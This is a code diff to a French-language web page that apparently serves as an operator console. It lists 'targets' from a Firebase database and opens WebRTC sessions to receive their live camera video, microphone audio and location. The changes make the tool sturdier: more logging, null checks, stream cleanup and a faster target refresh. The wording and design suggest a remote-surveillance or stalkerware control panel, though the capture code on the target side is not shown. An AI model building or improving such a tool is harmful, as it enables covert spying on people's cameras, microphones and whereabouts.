@@ -62,6 +62,7 @@
                                 <option value="">-- Attente de cibles --</option>
                             </select>
                         </div>
+                        <div id="selectedIdDebug" class="text-[10px] text-slate-500 text-center hidden"></div>
                     </div>
                 </div>
 
@@ -236,6 +237,11 @@
                 }
                 
                 userSelect.innerHTML = selectHTML;
+                
+                // Debug: Afficher la valeur sélectionnée
+                if (userSelect.value) {
+                    console.log("✅ Cible sélectionnée:", userSelect.value);
+                }
             });
         }
 
@@ -287,13 +293,22 @@
         }
 
         async function connectToUser() {
+            // Récupérer l'ID sélectionné correctement
             currentUserId = userSelect.value;
-            if (!currentUserId) {
-                addLog("⚠️ Aucune cible sélectionnée");
+            
+            addLog(`🔍 Tentative de connexion - ID sélectionné: "${currentUserId}"`);
+            
+            if (!currentUserId || currentUserId === "") {
+                addLog("⚠️ Veuillez sélectionner une cible dans la liste");
+                setSystemStatus("⚠️ Sélectionnez une cible", "pending");
                 return;
             }
 
-            disconnect();
+            // Nettoyer l'ancienne connexion
+            if (peerConnection) {
+                disconnect();
+            }
+            
             setSystemStatus("🔄 Connexion...", "pending");
             connectBtn.disabled = true;
             disconnectBtn.disabled = false;
@@ -301,38 +316,48 @@
             addLog(`🔍 Connexion à la cible #${currentUserId}...`);
 
             try {
+                // Vérifier que l'offre existe
                 const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
                 const offerSnapshot = await get(offerRef);
                 const offer = offerSnapshot.val();
 
-                if (!offer) {
-                    addLog("❌ Aucune offre WebRTC disponible");
+                if (!offer || !offer.sdp) {
+                    addLog(`❌ Aucune offre WebRTC pour la cible ${currentUserId}`);
                     setSystemStatus("❌ Aucun signal", "idle");
                     connectBtn.disabled = false;
                     disconnectBtn.disabled = true;
+                    currentUserId = null;
                     return;
                 }
+
+                addLog(`✅ Offre trouvée, établissement de la connexion...`);
 
                 peerConnection = new RTCPeerConnection(rtcConfig);
                 candidateQueue = [];
 
                 peerConnection.onconnectionstatechange = () => {
                     metaState.innerText = peerConnection.connectionState.toUpperCase();
-                    addLog(`État: ${peerConnection.connectionState}`);
+                    addLog(`État connexion: ${peerConnection.connectionState}`);
                     if (peerConnection.connectionState === 'connected') {
                         setSystemStatus("🔴 EN DIRECT", "live");
                         fullscreenBtn.disabled = false;
+                        addLog("🎉 CONNEXION ÉTABLIE ! Flux vidéo + audio actif");
+                    }
+                    if (peerConnection.connectionState === 'failed') {
+                        addLog("❌ Connexion échouée");
+                        disconnect();
                     }
                 };
 
                 peerConnection.ontrack = (event) => {
-                    addLog(`📡 Track reçue: ${event.track.kind}`);
+                    addLog(`📡 Track reçue: ${event.track.kind} - ${event.track.label || 'sans label'}`);
                     
                     if (event.track.kind === 'video') {
                         placeholderText.style.display = 'none';
                         remoteVideo.style.display = 'block';
                     }
                     
+                    // Gérer le stream
                     if (remoteVideo.srcObject) {
                         const stream = remoteVideo.srcObject;
                         stream.addTrack(event.track);
@@ -343,40 +368,55 @@
                     if (event.track.kind === 'audio') {
                         const badge = document.getElementById('audioStatusBadge');
                         badge.style.display = 'flex';
-                        addLog("🔊 MICROPHONE ACTIF - Son disponible !");
+                        addLog("🔊 MICROPHONE DÉTECTÉ ! Cliquez sur 'Activer Audio' pour écouter");
                         toggleAudioBtn.disabled = false;
-                        setupVolumeMeter(event.streams[0]);
+                        if (event.streams[0]) {
+                            setupVolumeMeter(event.streams[0]);
+                        }
                     }
                 };
 
                 peerConnection.onicecandidate = (event) => {
                     if (event.candidate) {
-                        push(ref(database, `webrtc/${currentUserId}/admin-candidates`), event.candidate.toJSON());
+                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
+                        push(candidateRef, event.candidate.toJSON());
+                        addLog(`📤 ICE candidate envoyé`);
                     }
                 };
 
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                addLog("✅ Offre reçue");
+                peerConnection.oniceconnectionstatechange = () => {
+                    addLog(`ICE état: ${peerConnection.iceConnectionState}`);
+                };
 
+                // Appliquer l'offre
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                addLog("✅ Offre SDP appliquée");
+
+                // Ajouter les candidats en attente
                 while (candidateQueue.length > 0) {
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidateQueue.shift())).catch(e => console.warn(e));
+                    const candidate = candidateQueue.shift();
+                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
                 }
 
+                // Créer et envoyer la réponse
                 const answer = await peerConnection.createAnswer();
                 await peerConnection.setLocalDescription(answer);
-                await set(ref(database, `webrtc/${currentUserId}/answer`), {
+                
+                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
+                await set(answerRef, {
                     sdp: answer.sdp,
                     type: answer.type,
                     timestamp: Date.now()
                 });
-                addLog("📤 Réponse envoyée");
+                addLog("📤 Réponse SDP envoyée");
 
+                // Écouter les candidats de l'utilisateur
                 const userCandidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
                 candidatesListenerRef = onValue(userCandidatesRef, (snapshot) => {
                     const candidates = snapshot.val();
-                    if (candidates) {
+                    if (candidates && peerConnection) {
                         Object.values(candidates).forEach(candidate => {
-                            if (peerConnection?.currentRemoteDescription) {
+                            if (peerConnection.currentRemoteDescription) {
                                 peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
                             } else {
                                 candidateQueue.push(candidate);
@@ -386,6 +426,7 @@
                 });
 
                 loadUserInfo(currentUserId);
+                addLog(`🎯 Connecté à ${currentUserId} - En attente du flux...`);
 
             } catch (err) {
                 addLog(`❌ Erreur: ${err.message}`);
@@ -395,17 +436,38 @@
         }
 
         function disconnect() {
+            addLog(`🔌 Déconnexion en cours...`);
+            
             if (volumeInterval) clearInterval(volumeInterval);
-            if (audioContext) audioContext.close();
-            if (candidatesListenerRef) off(ref(database, `webrtc/${currentUserId}/candidates`));
-            if (locationListenerRef) off(locationListenerRef);
-            if (peerConnection) peerConnection.close();
+            if (audioContext) {
+                audioContext.close();
+                audioContext = null;
+            }
+            if (candidatesListenerRef && currentUserId) {
+                off(ref(database, `webrtc/${currentUserId}/candidates`));
+                candidatesListenerRef = null;
+            }
+            if (locationListenerRef && currentUserId) {
+                off(locationListenerRef);
+                locationListenerRef = null;
+            }
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
             if (currentUserId) {
-                remove(ref(database, `webrtc/${currentUserId}/answer`));
-                remove(ref(database, `webrtc/${currentUserId}/admin-candidates`));
+                remove(ref(database, `webrtc/${currentUserId}/answer`)).catch(() => {});
+                remove(ref(database, `webrtc/${currentUserId}/admin-candidates`)).catch(() => {});
             }
 
-            remoteVideo.srcObject = null;
+            if (remoteVideo.srcObject) {
+                const stream = remoteVideo.srcObject;
+                if (stream.getTracks) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                remoteVideo.srcObject = null;
+            }
+            
             remoteVideo.style.display = 'none';
             document.getElementById('audioStatusBadge').style.display = 'none';
             placeholderText.style.display = 'flex';
@@ -422,18 +484,19 @@
             fullscreenBtn.disabled = true;
             metaState.innerText = "INACTIF";
             setSystemStatus("🔌 Déconnecté", "idle");
-            addLog("🔌 Déconnecté");
             
-            peerConnection = null;
+            addLog(`🔌 Déconnecté de ${currentUserId || 'aucune cible'}`);
             currentUserId = null;
         }
 
         function toggleAudio() {
+            if (!remoteVideo) return;
+            
             if (remoteVideo.muted) {
                 remoteVideo.muted = false;
                 toggleAudioBtn.innerText = "🔇 Couper Audio";
                 toggleAudioBtn.classList.replace('bg-emerald-800', 'bg-red-800');
-                addLog("🔊 Audio activé - Vous entendez le micro de la cible");
+                addLog("🔊 AUDIO ACTIVÉ - Vous entendez le microphone de la cible");
             } else {
                 remoteVideo.muted = true;
                 toggleAudioBtn.innerText = "🔊 Activer Audio";
@@ -444,20 +507,36 @@
 
         function toggleFullscreen() {
             if (!document.fullscreenElement) {
-                remoteVideo.requestFullscreen();
+                remoteVideo.requestFullscreen().catch(err => console.warn(err));
             } else {
                 document.exitFullscreen();
             }
         }
 
-        connectBtn.addEventListener('click', connectToUser);
+        // Événements
+        connectBtn.addEventListener('click', () => {
+            const selected = userSelect.value;
+            addLog(`🔘 Bouton connecter cliqué - Valeur sélectionnée: "${selected}"`);
+            connectToUser();
+        });
+        
         toggleAudioBtn.addEventListener('click', toggleAudio);
         disconnectBtn.addEventListener('click', disconnect);
         fullscreenBtn.addEventListener('click', toggleFullscreen);
-        userSelect.addEventListener('change', disconnect);
         
+        // Quand la sélection change, déconnecter automatiquement
+        userSelect.addEventListener('change', () => {
+            addLog(`📋 Changement de sélection: ${userSelect.value}`);
+            if (peerConnection) {
+                disconnect();
+            }
+        });
+        
+        // Rafraîchir la liste toutes les 3 secondes
         loadUsers();
-        setInterval(loadUsers, 5000);
+        setInterval(loadUsers, 3000);
+        
+        addLog("✅ Console prête - En attente de cibles...");
     </script>
 </body>
 </html>
